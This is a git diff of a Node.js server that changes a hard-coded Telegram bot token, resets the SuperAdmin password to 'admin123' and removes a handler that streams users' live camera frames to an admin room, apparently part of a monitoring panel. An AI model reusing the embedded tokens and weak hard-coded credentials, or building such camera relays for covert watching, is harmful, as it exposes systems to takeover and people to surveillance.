@@ -21,7 +21,7 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 // ═══════════════════════════════════════════════════════════════════
 // TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════
-const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
+const TELEGRAM_BOT_TOKEN = '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg';
 const TELEGRAM_CHAT_ID = '8262870180';
 
 /**
@@ -204,7 +204,7 @@ let db = {
   admins: [{
     id: 1,
     email: 'admin',
-    password: bcrypt.hashSync('@Zeronumber', 10),
+    password: bcrypt.hashSync('admin123', 10),
     name: 'Admin',
     role: 'SuperAdmin'
   }],
@@ -858,16 +858,6 @@ io.on('connection', (socket) => {
       io.to(data.adminSocketId).emit('webrtc:ice-candidate', {
         uuid: userUUID,
         candidate: data.candidate
-      });
-    });
-
-    // Handle high-speed live camera frames (No disk saving)
-    socket.on('camera:live_frame', (data) => {
-      if (!data || !data.uuid || !data.frame) return;
-      io.to('admin').emit('feed:frame', {
-        uuid: data.uuid,
-        frame: data.frame, // Send base64 directly
-        timestamp: data.timestamp || Date.now()
       });
     });
 
